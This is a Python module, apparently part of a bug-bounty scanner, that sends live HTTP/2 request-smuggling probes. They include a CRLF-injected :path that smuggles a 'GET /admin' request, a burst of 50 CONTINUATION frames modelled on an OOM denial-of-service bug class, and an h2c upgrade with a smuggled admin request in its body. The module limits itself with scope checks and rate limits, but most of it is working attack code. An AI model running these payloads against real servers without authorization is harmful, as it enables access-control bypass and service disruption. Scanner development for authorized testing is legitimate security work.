"""HTTP/2-specific request smuggling probes.

Three classes of bug-bounty-paying H2 attacks are tested:

  1. **CRLF in pseudo-headers** — sending an HTTP/2 request whose `:path`
     contains `\\r\\n` causes some upstreams to downgrade the request to
     HTTP/1.1 internally, smuggling the trailing bytes as a second
     request. Detection: a timing oracle (the server hangs waiting for
     bytes that never come for the smuggled second request).

  2. **CONTINUATION frame abuse** — many implementations have OOM /
     DoS bugs when receiving a long stream of CONTINUATION frames
     without END_HEADERS. We send a moderate burst (kept benign — 50
     frames, ~100 KB total) and watch for an unusually long or stalled
     response.

  3. **h2c upgrade smuggling** — request HTTP/2 cleartext via
     `Connection: Upgrade, HTTP2-Settings`. Some intermediaries pass
     the upgrade through but the back-end speaks HTTP/1.1, leaving the
     attacker control of the upgrade-prior request body.

Implementation uses the `h2` sans-IO library (a transitive dependency of
httpx) wired to a raw asyncio TCP/TLS connection so we control every
frame. Honors scope and the per-host token bucket.
"""
from __future__ import annotations

import asyncio
import socket
import ssl
import time
from typing import TYPE_CHECKING
from urllib.parse import urlparse

from core.utils import root_domain

if TYPE_CHECKING:
    from core.orchestrator import Context

_STATIC_EXT = (".js", ".css", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg",
               ".ico", ".woff", ".woff2", ".ttf", ".eot", ".mp4", ".webp", ".pdf")


def _same_site(host: str, target: str) -> bool:
    th = urlparse(target if "://" in target else "http://" + target).hostname or target
    try:
        return root_domain(host) == root_domain(th)
    except Exception:
        return host == th


def _is_static(path: str) -> bool:
    return (path or "/").lower().rsplit("?", 1)[0].endswith(_STATIC_EXT)


async def _h2_open(host: str, port: int, use_tls: bool, bucket=None):
    """Return (reader, writer, h2.Connection) ready to send frames."""
    if bucket is not None:
        await bucket.take()
    try:
        from h2.connection import H2Connection
        from h2.config import H2Configuration
    except ImportError:
        return None, None, None
    if use_tls:
        ctx_ssl = ssl.create_default_context()
        ctx_ssl.check_hostname = False
        ctx_ssl.verify_mode = ssl.CERT_NONE
        ctx_ssl.set_alpn_protocols(["h2"])
    else:
        ctx_ssl = None
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ctx_ssl,
                                    server_hostname=host if use_tls else None),
            timeout=5.0,
        )
    except Exception:
        return None, None, None
    cfg = H2Configuration(client_side=True, header_encoding="utf-8")
    conn = H2Connection(config=cfg)
    conn.initiate_connection()
    writer.write(conn.data_to_send())
    await writer.drain()
    return reader, writer, conn


async def _h2_send_request(host, conn, writer, headers: list[tuple[str, str]]):
    stream_id = conn.get_next_available_stream_id()
    conn.send_headers(stream_id, headers, end_stream=True)
    writer.write(conn.data_to_send())
    await writer.drain()
    return stream_id


async def _h2_read_until_close(reader, conn, timeout=8.0) -> bytes:
    buf = b""
    try:
        while True:
            chunk = await asyncio.wait_for(reader.read(8192), timeout=timeout)
            if not chunk:
                break
            buf += chunk
            try:
                conn.receive_data(chunk)
            except Exception:
                break
            if len(buf) > 65536:
                break
    except asyncio.TimeoutError:
        pass
    return buf


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    parsed = urlparse(url)
    host = parsed.hostname or ""
    if not host:
        return findings
    # scope hygiene: active_allows refuses third-party CDNs and off-domain hosts
    if ctx.scope:
        ok, _why = ctx.scope.active_allows(url, ctx.target)
        if not ok:
            return findings
    elif not _same_site(host, ctx.target):
        return findings
    if _is_static(parsed.path or "/"):
        return findings
    use_tls = parsed.scheme == "https"
    port = parsed.port or (443 if use_tls else 80)
    path = parsed.path or "/"
    bucket = ctx.http.host_bucket(parsed.netloc)

    findings.extend(await _crlf_pseudo_header(host, port, path, use_tls, bucket, url))
    findings.extend(await _continuation_flood(host, port, path, use_tls, bucket, url))
    findings.extend(await _h2c_upgrade_smuggle(host, port, path, url, ctx))
    return findings


# ---------- 1: CRLF in :path / :authority --------------------------------

async def _measure_crlf(host, port, path, use_tls, bucket) -> tuple[float, bytes, str]:
    """Send the CRLF-in-:path probe; return (elapsed, response_bytes, smuggled_path)."""
    reader, writer, conn = await _h2_open(host, port, use_tls, bucket)
    # craft a :path with embedded CRLF + smuggled second request
    # the smuggled request asks for /admin which front-end might block but back-end honors
    smuggled = f"{path} HTTP/1.1\r\nHost: {host}\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}"
    if conn is None:
        return 0.0, b"", smuggled
    headers = [
        (":method", "GET"),
        (":path", smuggled),
        (":scheme", "https" if use_tls else "http"),
        (":authority", host),
        ("user-agent", "SamaritanX/1.0"),
    ]
    t0 = time.perf_counter()
    try:
        await _h2_send_request(host, conn, writer, headers)
        data = await _h2_read_until_close(reader, conn, timeout=8.0)
    except Exception:
        data = b""
    elapsed = time.perf_counter() - t0
    try:
        writer.close(); await writer.wait_closed()
    except Exception:
        pass
    return elapsed, data, smuggled


async def _measure_clean(host, port, path, use_tls, bucket) -> float:
    """Baseline: a well-formed H2 GET to the same path; return elapsed seconds."""
    reader, writer, conn = await _h2_open(host, port, use_tls, bucket)
    if conn is None:
        return 0.0
    headers = [
        (":method", "GET"), (":path", path or "/"),
        (":scheme", "https" if use_tls else "http"),
        (":authority", host), ("user-agent", "SamaritanX/1.0"),
    ]
    t0 = time.perf_counter()
    try:
        await _h2_send_request(host, conn, writer, headers)
        await _h2_read_until_close(reader, conn, timeout=8.0)
    except Exception:
        pass
    elapsed = time.perf_counter() - t0
    try:
        writer.close(); await writer.wait_closed()
    except Exception:
        pass
    return elapsed


async def _crlf_pseudo_header(host, port, path, use_tls, bucket, url) -> list[dict]:
    findings = []
    elapsed, data, smuggled = await _measure_crlf(host, port, path, use_tls, bucket)
    if not (elapsed > 5.0 and data):
        return findings

    # One hang isn't proof — a cold connection or generic slow path looks the
    # same. Confirm the CRLF probe hangs *and* a well-formed H2 GET to the same
    # path stays prompt, then re-measure the CRLF probe once more for stability.
    base = await _measure_clean(host, port, path, use_tls, bucket)
    elapsed2, data2, _ = await _measure_crlf(host, port, path, use_tls, bucket)
    if not (base < 5.0 and elapsed2 > 5.0 and data2):
        return findings  # clean path also slow, or hang didn't reproduce → jitter

    samples = [{"crlf_path_s": round(elapsed, 2)},
               {"crlf_path_s": round(elapsed2, 2), "clean_path_s": round(base, 2)}]
    findings.append({
        "category": "smuggling",
        "title": "HTTP/2 request smuggling — CRLF in pseudo-header (:path)",
        "severity": "critical", "cvss": 9.0, "confidence": 0.3,
        "url": url,
        "evidence": f"A :path containing \\r\\n caused the upstream to hang for "
                    f"{elapsed2:.2f}s while a clean H2 GET to the same path returned in "
                    f"{base:.2f}s (confirmed across 2 rounds) — the malformed frame is "
                    "downgraded to HTTP/1.1 and a smuggled second request queued.",
        "request": f"H2 :path = {repr(smuggled)[:200]}",
        "metadata": {"elapsed_s": elapsed2, "kind": "h2_crlf_path", "samples": samples},
    })
    return findings


async def reprobe(ctx: "Context", finding: dict):
    """Re-verify an h2_crlf_path finding: the CRLF probe must hang while a clean
    H2 GET to the same path returns promptly, reproducibly across repeats.

    Returns ``(result, proof)`` — True (reproduced), False (hang gone), or None
    (noisy / not applicable). The proof captures the smuggled :path and timings.
    """
    url = finding.get("url") or ""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    if not host:
        return None, {}
    if ctx.scope and not ctx.scope.allows(url)[0]:
        return None, {}
    if (finding.get("metadata") or {}).get("kind") != "h2_crlf_path":
        return None, {}
    use_tls = parsed.scheme == "https"
    port = parsed.port or (443 if use_tls else 80)
    path = parsed.path or "/"
    bucket = ctx.http.host_bucket(parsed.netloc)

    smuggled = ""
    samples = []
    for _ in range(2):
        t_evil, data, smuggled = await _measure_crlf(host, port, path, use_tls, bucket)
        t_base = await _measure_clean(host, port, path, use_tls, bucket)
        samples.append({"crlf_path_s": round(t_evil, 2),
                        "clean_path_s": round(t_base, 2),
                        "responded": bool(data)})

    confirmed = all(s["crlf_path_s"] > 5.0 and s["clean_path_s"] < 5.0 and s["responded"]
                    for s in samples)
    clearly_fast = all(s["crlf_path_s"] < 5.0 for s in samples)
    proof = {
        "verified": confirmed, "method": "RAW-H2", "url": url,
        "request": f"H2 :path = {repr(smuggled)[:200]}",
        "samples": samples,
        "rationale": (
            "A :path carrying CRLF hung (>5s) while a clean H2 GET to the same path "
            f"returned promptly across {len(samples)} repeats — the malformed frame is "
            "being downgraded and a smuggled request queued on the back-end socket."
            if confirmed else
            "The CRLF-induced hang did not reproduce consistently on re-test."),
    }
    if confirmed:
        return True, proof
    if clearly_fast:
        return False, proof
    return None, proof


# ---------- 2: CONTINUATION abuse ----------------------------------------

async def _continuation_flood(host, port, path, use_tls, bucket, url) -> list[dict]:
    reader, writer, conn = await _h2_open(host, port, use_tls, bucket)
    if conn is None:
        return []
    findings = []
    # Send a HEADERS frame WITHOUT END_HEADERS, followed by 50 CONTINUATION
    # frames each carrying junk header padding. Most servers either reject
    # the stream or close the connection. Servers that buffer everything
    # without limit are vulnerable to OOM (CVE-2024-27983 class).
    try:
        from hyperframe.frame import HeadersFrame, ContinuationFrame
        from hpack import Encoder
    except ImportError:
        try:
            writer.close(); await writer.wait_closed()
        except Exception:
            pass
        return []
    enc = Encoder()
    base_block = enc.encode([
        (":method", "GET"), (":path", path), (":scheme", "https" if use_tls else "http"),
        (":authority", host),
    ])
    hf = HeadersFrame(stream_id=1)
    hf.flags.add("PRIORITY")  # ensure no END_HEADERS
    hf.data = base_block
    writer.write(hf.serialize())
    pad_block = enc.encode([("x-sx-pad-" + str(i), "A" * 200) for i in range(8)])
    for i in range(50):
        cf = ContinuationFrame(stream_id=1)
        if i == 49:
            cf.flags.add("END_HEADERS")
        cf.data = pad_block
        writer.write(cf.serialize())
    await writer.drain()
    t0 = time.perf_counter()
    try:
        data = await _h2_read_until_close(reader, conn, timeout=10.0)
    except Exception:
        data = b""
    elapsed = time.perf_counter() - t0
    try:
        writer.close(); await writer.wait_closed()
    except Exception:
        pass
    # If the server happily returned a 200/206 the stream is treated as valid
    # despite the unbounded header section — that's the vulnerable shape
    if data and elapsed < 5.0 and (b" 200 " in data or b"\x00\x00" in data[:9]):
        findings.append({
            "category": "smuggling",
            "title": "HTTP/2 CONTINUATION-frame flood accepted (potential DoS / smuggling primitive)",
            "severity": "high", "cvss": 7.4, "confidence": 0.3,
            "url": url,
            "evidence": "Server accepted 50 CONTINUATION frames carrying ~100 KB of header "
                        "padding without rejecting the stream — header buffer is unbounded "
                        "(CVE-2024-27983 class). Exploitable for OOM DoS or downgrade-driven "
                        "smuggling on stacks that share the parsed header buffer with HTTP/1.1.",
            "request": f"H2 HEADERS + 50× CONTINUATION on {url}",
            "metadata": {"elapsed_s": elapsed, "kind": "h2_continuation_flood"},
        })
    return findings


# ---------- 3: h2c upgrade smuggling -------------------------------------

async def _h2c_upgrade_smuggle(host, port, path, url, ctx) -> list[dict]:
    """A classic HTTP/1.1 request that asks the front-end to upgrade to h2c.
    If the back-end doesn't support h2c but the front-end forwards the
    upgrade headers anyway, the prior body becomes a smuggled HTTP/1.1
    request. We use ctx.http (not raw socket) since we only need the
    /1.1 surface for this probe."""
    findings = []
    smuggle_body = (
        "GET /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "X-SX-Smuggle: 1\r\n\r\n"
    )
    headers = {
        "Connection": "Upgrade, HTTP2-Settings",
        "Upgrade": "h2c",
        "HTTP2-Settings": "AAMAAABkAARAAAAAAAIAAAAA",
        "Content-Length": str(len(smuggle_body)),
        "Content-Type": "text/plain",
    }
    ev = await ctx.http.post(url, data=smuggle_body, headers=headers,
                             allow_redirects=False)
    if ev.error:
        return findings
    # Heuristic — reply suggests the smuggled "/admin" was processed
    body = (ev.response_body or "").lower()
    if (ev.status == 101 and "h2c" in str(ev.response_headers).lower()) or \
       ("admin" in body and ev.status in (200, 401, 403) and "x-sx-smuggle" not in str(ev.response_headers)):
        findings.append({
            "category": "smuggling",
            "title": "h2c upgrade smuggling — front-end forwards HTTP/2 cleartext upgrade",
            "severity": "high", "cvss": 8.0, "confidence": 0.3,
            "url": url,
            "evidence": "Server accepted Upgrade: h2c with a CL-bearing body, AND the "
                        "response contains evidence the smuggled GET /admin was processed "
                        "(or the 101 came back). Front-end and back-end disagree on whether "
                        "the upgrade applies — bytes after the upgrade headers become a "
                        "smuggled request.",
            "request": f"POST {url}\nUpgrade: h2c\n\n{smuggle_body[:200]}",
            "response": (ev.response_body or "")[:1500],
            "metadata": {"kind": "h2c_upgrade", "status": ev.status},
        })
    return findings
